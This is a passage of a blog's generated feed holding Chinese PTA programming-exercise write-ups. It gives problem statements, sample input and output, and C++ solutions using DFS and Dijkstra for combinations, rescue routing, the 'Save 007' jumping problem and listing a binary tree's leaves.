href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,r,t,sum;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> cnt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(sum==t)&#123;     <span class="comment">//如果到数了退出</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(cnt<span class="number">-1</span>==m)&#123;</span><br><span class="line">sum++;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, f[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">vis[i]=<span class="number">1</span>;<span class="comment">//标记</span></span><br><span class="line">f[cnt]=i;<span class="comment">//计数</span></span><br><span class="line">dfs(i<span class="number">-1</span>,cnt+<span class="number">1</span>);</span><br><span class="line">vis[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;n,&amp;m,&amp;t);</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">dfs(n,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pta-7-5 城市间紧急救援 (25分)(dijkstra)</title>
      <link href="/2020/02/01/pta-7-5-%E5%9F%8E%E5%B8%82%E9%97%B4%E7%B4%A7%E6%80%A5%E6%95%91%E6%8F%B4-25%E5%88%86-1/"/>
      <url>/2020/02/01/pta-7-5-%E5%9F%8E%E5%B8%82%E9%97%B4%E7%B4%A7%E6%80%A5%E6%95%91%E6%8F%B4-25%E5%88%86-1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>作为一个城市的应急救援队伍的负责人，你有一张特殊的全国地图。在地图上显示有多个分散的城市和一些连接城市的快速道路。每个城市的救援队数量和每一条连接两个城市的快速道路长度都标在地图上。当其他城市有紧急求助电话给你的时候，你的任务是带领你的救援队尽快赶往事发地，同时，一路上召集尽可能多的救援队。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入第一行给出4个正整数N、M、S、D，其中N（2≤N≤500）是城市的个数，顺便假设城市的编号为0 ~ (N−1)；M是快速道路的条数；S是出发地的城市编号；D是目的地的城市编号。</p><p>第二行给出N个正整数，其中第i个数是第i个城市的救援队的数目，数字间以空格分隔。随后的M行中，每行给出一条快速道路的信息，分别是：城市1、城市2、快速道路的长度，中间用空格分开，数字均为整数且不超过500。输入保证救援可行且最优解唯一。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>第一行输出最短路径的条数和能够召集的最多的救援队数量。第二行输出从S到D的路径中经过的城市编号。数字间以空格分隔，输出结尾不能有多余空格。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">5</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">20 </span><span class="number">30</span> <span class="number">40</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">3</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">2</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="number">60</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">const int <span class="symbol">INF</span>=<span class="number">0x3fffffff</span>;</span><br><span class="line">int dij[<span class="number">501</span>];</span><br><span class="line">int way[<span class="number">501</span>][<span class="number">501</span>];</span><br><span class="line">int save[<span class="number">501</span>];</span><br><span class="line">int book[<span class="number">501</span>];</span><br><span class="line">int f[<span class="number">501</span>];</span><br><span class="line">int w[<span class="number">501</span>];</span><br><span class="line">int num[<span class="number">501</span>];</span><br><span class="line">void print(int v,int s)&#123;</span><br><span class="line">    if(v==s)&#123;</span><br><span class="line">        cout&lt;&lt;v;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    print(f[v],s);</span><br><span class="line">    cout&lt;&lt;<span class="string">" "</span>&lt;&lt;v;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n,m,s,d;</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(<span class="string">"%d %d %d %d"</span>,&amp;n,&amp;m,&amp;s,&amp;d);</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;n;i++)&#123;//初始化 </span><br><span class="line">dij[i]=<span class="symbol">INF</span>;</span><br><span class="line">for(int j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">way[i][j]=<span class="symbol">INF</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">scanf(<span class="string">"%d"</span>,&amp;save[i]);</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">scanf(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line">scanf(<span class="string">"%d"</span>,&amp;way[a][b]);</span><br><span class="line">way[b][a]=way[a][b];</span><br><span class="line">&#125;</span><br><span class="line">dij[s]=<span class="number">0</span>;</span><br><span class="line">w[s]=save[s];//起点的救援队</span><br><span class="line">num[s]=<span class="number">1</span>;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">int x=<span class="number">-1</span>,m=<span class="symbol">INF</span>;</span><br><span class="line">for(int j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">if(!book[j]&amp;&amp;dij[j]&lt;=m)</span><br><span class="line">m=dij[x=j];</span><br><span class="line">&#125;</span><br><span class="line">book[x]=<span class="number">1</span>;//标记</span><br><span class="line">if(x==d)//一次到达目的地 </span><br><span class="line">break; </span><br><span class="line">for(int j=<span class="number">0</span>;j&lt;n;j++)&#123;//下一步 </span><br><span class="line">if(book[j]||way[x][j]==<span class="symbol">INF</span>)//如果走过或者没路 </span><br><span class="line">continue;</span><br><span class="line">if(dij[j]&gt;dij[x]+way[x][j])&#123;//如果上一步加现在的比下一步短 </span><br><span class="line">dij[j]=dij[x]+way[x][j];</span><br><span class="line">w[j]=w[x]+save[j];//救援队</span><br><span class="line">f[j]=x;</span><br><span class="line">num[j]=num[x];</span><br><span class="line">&#125;</span><br><span class="line">else if(dij[j]==dij[x]+way[x][j])&#123;</span><br><span class="line">if(w[j]&lt;w[x]+save[j])&#123;//相同时选救援队最多的 </span><br><span class="line">f[j]=x;</span><br><span class="line">w[j]=w[x]+save[j];</span><br><span class="line">&#125;</span><br><span class="line">num[j]+=num[x]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"%d %d\n"</span>,num[d],w[d]);</span><br><span class="line">print(d,s);</span><br><span class="line">return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前一直没接触过dijkstra，平常遇到用的都是flyd<a href="https://blog.csdn.net/caipengbenren/article/details/86585284" target="_blank" rel="noopener">感谢cp0328大佬</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta7-13 拯救007 (25分)DFS</title>
      <link href="/2020/01/31/pta7-13-%E6%8B%AF%E6%95%91007-25%E5%88%86/"/>
      <url>/2020/01/31/pta7-13-%E6%8B%AF%E6%95%91007-25%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>7-13 拯救007 (25分)</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在老电影“007之生死关头”（Live and Let Die）中有一个情节，007被毒贩抓到一个鳄鱼池中心的小岛上，他用了一种极为大胆的方法逃脱 —— 直接踩着池子里一系列鳄鱼的大脑袋跳上岸去！（据说当年替身演员被最后一条鳄鱼咬住了脚，幸好穿的是特别加厚的靴子才逃过一劫。）</p><p>设鳄鱼池是长宽为100米的方形，中心坐标为 (0, 0)，且东北角坐标为 (50, 50)。池心岛是以 (0, 0) 为圆心、直径15米的圆。给定池中分布的鳄鱼的坐标、以及007一次能跳跃的最大距离，你需要告诉他是否有可能逃出生天。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>首先第一行给出两个正整数：鳄鱼数量 N（≤100）和007一次能跳跃的最大距离 D。随后 N 行，每行给出一条鳄鱼的 (x,y) 坐标。注意：不会有两条鳄鱼待在同一个点上。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>如果007有可能逃脱，就在一行中输出”Yes”，否则输出”No”。</p><h2 id="输入样例-1："><a href="#输入样例-1：" class="headerlink" title="输入样例 1："></a>输入样例 1：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span> <span class="number">20</span></span><br><span class="line"><span class="number">25</span> <span class="number">-15</span></span><br><span class="line"><span class="number">-25</span> <span class="number">28</span></span><br><span class="line"><span class="number">8</span> <span class="number">49</span></span><br><span class="line"><span class="number">29</span> <span class="number">15</span></span><br><span class="line"><span class="number">-35</span> <span class="number">-2</span></span><br><span class="line"><span class="number">5</span> <span class="number">28</span></span><br><span class="line"><span class="number">27</span> <span class="number">-29</span></span><br><span class="line"><span class="number">-8</span> <span class="number">-28</span></span><br><span class="line"><span class="number">-20</span> <span class="number">-35</span></span><br><span class="line"><span class="number">-25</span> <span class="number">-20</span></span><br><span class="line"><span class="number">-13</span> <span class="number">29</span></span><br><span class="line"><span class="number">-30</span> <span class="number">15</span></span><br><span class="line"><span class="number">-35</span> <span class="number">40</span></span><br><span class="line"><span class="number">12</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><h2 id="输出样例1："><a href="#输出样例1：" class="headerlink" title="输出样例1："></a>输出样例1：</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">Yes</span></span><br></pre></td></tr></table></figure><h2 id="输入样例2："><a href="#输入样例2：" class="headerlink" title="输入样例2："></a>输入样例2：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">13</span></span><br><span class="line"><span class="number">-12</span> <span class="number">12</span></span><br><span class="line"><span class="number">12</span> <span class="number">12</span></span><br><span class="line"><span class="number">-12</span> <span class="number">-12</span></span><br><span class="line"><span class="number">12</span> <span class="number">-12</span></span><br></pre></td></tr></table></figure><h2 id="输出样例2："><a href="#输出样例2：" class="headerlink" title="输出样例2："></a>输出样例2：</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">No</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">&#125;great[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">1100</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">first</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> p1=great[i].x*great[i].x;</span><br><span class="line"><span class="keyword">int</span> p2=great[i].y*great[i].y;</span><br><span class="line"><span class="keyword">int</span> num=(m+<span class="number">7.5</span>)*(m+<span class="number">7.5</span>);<span class="comment">//中心岛跳出</span></span><br><span class="line"><span class="keyword">if</span>(p1+p2&lt;=num)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(great[x].x-m&lt;=<span class="number">-50</span>||great[x].x+m&gt;=<span class="number">50</span>||great[x].y-m&lt;=<span class="number">-50</span>||great[x].y+m&gt;=<span class="number">50</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;<span class="comment">//判断能不能跳到下个鳄鱼 </span></span><br><span class="line"><span class="keyword">int</span> p1=(great[i].x-great[j].x)*(great[i].x-great[j].x); </span><br><span class="line"><span class="keyword">int</span> p2=(great[i].y-great[j].y)*(great[i].y-great[j].y);</span><br><span class="line"><span class="keyword">if</span>(p1+p2&lt;=m*m)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">vis[x]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(key(x))&#123;<span class="comment">//能直接出去 </span></span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i]&amp;&amp;jump(x,i))&#123;</span><br><span class="line">dfs(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;great[i].x,&amp;great[i].y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(m&gt;=<span class="number">50</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i]&amp;&amp;first(i))&#123;<span class="comment">//判断第一跳能不能直接出去 </span></span><br><span class="line">dfs(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-40 列出叶结点 (25分)</title>
      <link href="/2020/01/27/pta-7-40-%E5%88%97%E5%87%BA%E5%8F%B6%E7%BB%93%E7%82%B9-25%E5%88%86/"/>
      <url>/2020/01/27/pta-7-40-%E5%88%97%E5%87%BA%E5%8F%B6%E7%BB%93%E7%82%B9-25%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>pta-7-40 列出叶结点 (25分)</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>对于给定的二叉树，本题要求你按从上到下、从左到右的顺序输出其所有叶节点。</p><a id="more"></a><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>首先第一行给出一个正整数 N（≤10），为树中结点总数。树中的结点从 0 到 N−1 编号。随后 N 行，每行给出一个对应结点左右孩子的编号。如果某个孩子不存在，则在对应位置给出 “-“。编号间以 1 个空格分隔。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>在一行中按规定顺序输出叶节点的编号。编号间以 1 个空格分隔，行首尾不得有多余空格。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">1</span> -</span><br><span class="line">- -</span><br><span class="line"><span class="number">0</span> -</span><br><span class="line"><span class="number">2</span> <span class="number">7</span></span><br><span class="line">- -</span><br><span class="line">- -</span><br><span class="line"><span class="number">5</span> -</span><br><span class="line"><span class="number">4</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">1</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><p><img src="/1.jpg" alt="我师傅灵魂画师"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> Left,Right;</span><br><span class="line">&#125;p[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> Root[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; leaf[<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> s,<span class="keyword">int</span> cur)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p[s].Left==<span class="string">'-'</span>&amp;&amp;p[s].Right==<span class="string">'-'</span>)&#123;</span><br><span class="line">leaf[cur].push_back(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p[s].Left!=<span class="string">'-'</span>)</span><br><span class="line">func(p[s].Left-<span class="string">'0'</span>,cur+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(p[s].Right!=<span class="string">'-'</span>)</span><br><span class="line">func(p[s].Right-<span class="string">'0'</span>,cur+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;p[i].Left&gt;&gt;p[i].Right;</span><br><span class="line">Root[p[i].Left-<span class="string">'0'</span>]=<span class="number">1</span>;</span><br><span class="line">Root[p[i].Right-<span class="string">'0'</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ri;<span class="comment">//根节点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!Root[i])&#123;</span><br><span class="line">ri=i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func(ri,<span class="number">1</span>);<span class="comment">//开始找 </span></span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;leaf[i].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;leaf[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 